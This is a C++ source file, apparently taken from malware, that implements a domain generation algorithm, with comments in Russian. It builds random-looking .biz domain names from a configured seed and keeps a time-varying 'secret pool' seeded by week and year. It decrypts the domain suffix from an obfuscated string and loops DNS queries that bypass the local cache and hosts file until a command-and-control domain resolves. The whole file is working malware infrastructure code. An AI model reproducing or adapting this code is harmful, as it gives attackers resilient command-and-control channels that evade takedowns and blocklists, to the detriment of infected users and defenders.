#include "dga.hpp"
#include "utils.hpp"
#include "strings.hpp"
#include "configreader.h"

DefaultDomainGenerator::DefaultDomainGenerator()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultDomainGenerator] constructor");
#endif
	this->iIndex = 0;
	this->iPoolTries = 0;
	this->bSecretPool = FALSE; // по дефолту начинаем с статичного во времени пула
	this->pRecord = nullptr;
}

DefaultDomainGenerator::~DefaultDomainGenerator()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultDomainGenerator] destructor");
#endif
	if (this->pRecord != nullptr)
		DnsRecordListFree(this->pRecord, DnsFreeRecordListDeep);
}

BOOL DefaultDomainGenerator::find_active_domain()
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	this->free_domain();
		
	WCHAR wchDomainName[MAX_DOMAINNAME_LENGTH * 2 + 1024];

	BOOL bRet = FALSE;
	long holdrand = 0;

	DNS_STATUS status = 0;
	DWORD dwQueryFlags = DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_LOCAL_NAME | DNS_QUERY_NO_HOSTS_FILE;

	for (;;)
	{
		// если максимальное, то начнем сначала
		if (iIndex >= MAX_DOMAIN_AMOUNT)
			iIndex = 0;

		for (; iIndex < MAX_DOMAIN_AMOUNT; iIndex++)
		{
			RtlSecureZeroMemory(wchDomainName, sizeof(wchDomainName));

			// получим сид для генерации домена конкретного
			holdrand = this->get_domain_seed(iIndex);
			this->gen_domainname(&holdrand,
				wchDomainName,
				(_rand(&holdrand) % (MAX_DOMAINNAME_LENGTH - MIN_DOMAINNAME_LENGTH)) + MIN_DOMAINNAME_LENGTH);

#ifndef _DEBUG_CHANNEL
			status = DnsQuery_W(wchDomainName, DNS_TYPE_A, dwQueryFlags, NULL, &this->pRecord, NULL);

#ifdef _DEBUG
			wsprintfW(debugOut, L"[DefaultDomainGenerator::find_active_domain] seed = 0x%x, iIndex = %i, DnsQuery %s with status 0x%x", config_data::cfg->dwDGASeed, iIndex, wchDomainName, status);
			WriteLog(debugOut);
#endif
#else // в дебаг канале через файлы нам это все не надо
			status = DNS_RCODE_NO_ERROR;
#endif
			// если успешно то выйдем
			if (status == DNS_RCODE_NOERROR)
			{
				bRet = TRUE;
				break;
			}
		}
		if (status == DNS_RCODE_NOERROR)
			break;

		// а иначе подождем перед следующей итерацией DGA по всем доменам с данным seed
		Sleep(DGA_TIMEOUT);
	}

	return bRet;
}

BOOL DefaultDomainGenerator::continue_domain_search()
{
	this->iIndex++;
	return this->find_active_domain();
}

UINT DefaultDomainGenerator::get_index()
{
	return this->iIndex;
}

UINT DefaultDomainGenerator::set_index(UINT newIndex)
{
	this->iIndex = newIndex;
	return newIndex;
}

VOID DefaultDomainGenerator::free_domain()
{
	if (this->pRecord != nullptr)
	{
		DnsRecordListFree(this->pRecord, DnsFreeRecordListDeep);
		this->pRecord = nullptr;
	}

	return;
}

PDNS_RECORD DefaultDomainGenerator::get_record()
{
	return this->pRecord;
}

VOID DefaultDomainGenerator::gen_domainname(long * holdrand, PWCHAR pwOut, UINT uLength)
{	
#ifndef _DEBUG_CHANNEL
	for (UINT i = 0; i < uLength; i++)
		pwOut[i] = (_rand(holdrand) % (L'z' - L'a' + 1)) + L'a';

	CCryptString cStr_Dotbiz(cryptedstr_dotbiz);
	wcscat(pwOut, cStr_Dotbiz.w_str());
#else
	// для дебага статик домен
	wcscpy(pwOut, L"adminpanel.com");
	// ----------------------
#endif

	return;
}

long DefaultDomainGenerator::get_domain_seed(UINT iIndex)
{
	long dwRet = 0;

	if (this->iPoolTries >= MAXTRIES_SWITCH_TRIGGER)
	{
#ifdef _DEBUG
		WriteLog(L"[DefaultDomainGenerator::get_domain_seed] max tries in this pool reached, switching to other pool");
#endif
		this->iPoolTries = 0;
		this->bSecretPool = !this->bSecretPool;
	}

	if (this->bSecretPool) 	// секретный пул пермутирует dwDGASeed в зависимости от недели и года
		dwRet = this->secret_domain_seed(iIndex);
	else // обычный пул просто ксорит индекс с сидом
		dwRet = config_data::cfg->dwDGASeed ^ iIndex;

	this->iPoolTries++;

	return dwRet;
}

long DefaultDomainGenerator::secret_domain_seed(UINT iIndex)
{

	SYSTEMTIME stime;
	RtlSecureZeroMemory(&stime, sizeof(stime));

	GetSystemTime(&stime);
	// для секретного пула сделаем такие преобразования
	// N = ((30.5 * month) - day) / 7, где N будет меняться раз в 6-8 дней
	// в последствии мы должны N раз изменить seed = (seed + year) через seed = ROTL(seed + 1,1), после чего поксорить его с iIndex
	// инкрементация seed перед ротацией требуется для того, чтобы не было зацикливаний и в течении года не получалось так, что после N == 7 у нас повторялись домены

	long dwSeed = config_data::cfg->dwDGASeed + stime.wYear;
	UINT weekN = UINT(((30.5 * (float)stime.wMonth) - (float)stime.wDay) / 7.0);

	for (UINT iCounter = 0; iCounter < weekN; iCounter++)
	{
		dwSeed = _lrotl(dwSeed + 1, 1);
	}
	
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[DefaultDomainGenerator::secret_domain_seed] secret domain pool seed is 0x%x ^ %d with %d.%d.%d and week num %d", dwSeed, iIndex, stime.wDay, stime.wMonth, stime.wYear, weekN);
	WriteLog(debugOut);
#endif


	return dwSeed ^ iIndex;
}
